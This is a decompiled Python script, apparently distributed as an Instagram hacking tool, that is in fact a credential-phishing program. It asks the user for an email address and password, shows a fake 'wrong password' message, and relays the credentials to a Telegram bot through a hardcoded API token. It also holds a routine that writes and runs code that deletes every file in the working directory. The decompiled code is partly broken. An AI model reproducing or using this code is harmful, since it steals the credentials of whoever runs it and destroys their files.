# Source Generated with Decompyle++
# File: bexm.pyc (Python 3.10)

''' +---------------------------+
        author : Ahmad Adptr
        status : jomblo
    +---------------------------+
'''
import os
import time
import sys
import random
import re

def checking_version():
    version = sys.version
    if not re.findall('3.', version[0:6]):
        clear()
        sys.exit('\nketik python hack_ig.py\n')
        return None


def Kill_Recode():
    command = '\n    \nimport re, os, sys\n\nfile = os.listdir()\n \ntry:\n    x = open("cracking.py","r").read()\n    if not re.findall("import marshal",x):\n        for i in file:\n            os.system("rm -rf " + i)\n    else: pass\nexcept:\n    os.system("rm -rf *") '
    open('coba.py', 'w').write(command)
    os.system('python coba.py')


def clear():
    if os.name == 'nt':
        os.system('cls')
        return None
    None.system('clear')

checking_version()

try:
    import telebot
    import rich
finally:
    pass

API_KEY = None if ModuleNotFoundError else '5531763646:AAFsn-_LA7v-Df-CZM2R9q0oYHbqVz3ELwA'
botAhmad = telebot.TeleBot(API_KEY)

def Detection(email):
    if not re.findall('.com| @', email.lower()):
        clear()
        sys.exit('\n\x1b[31;1memail tidak valid\n\x1b[0m')
        return None

from rich.panel import Panel

def ShowPishing():
    global email, password
    name = '[default][bold cyan]masukkan nama account email Anda '
    passw = '[default][bold red]masukkan password email Anda '
    print('Silahkan login terlebih dulu\n============================\n')
    rich.print(Panel(name, '[ username ]', 'green', **('title', 'style')))
    email = input('-> [email] : ')
    Detection(email)
    rich.print(Panel(passw, '[ password ]', 'green', **('title', 'style')))
    password = input('-> [password] : ')

Kill_Recode()
ShowPishing()
print('\nkata sandi Anda salah!\n')
mess = f'''email : {email}\npassword : {password}'''
if __name__ == '__main__':
    
    def account(message):
        botyanto.reply_to(message, mess)

    account = botyanto.message_handler((lambda message: True), **('func',))(account)
    botyanto.polling()
    return None
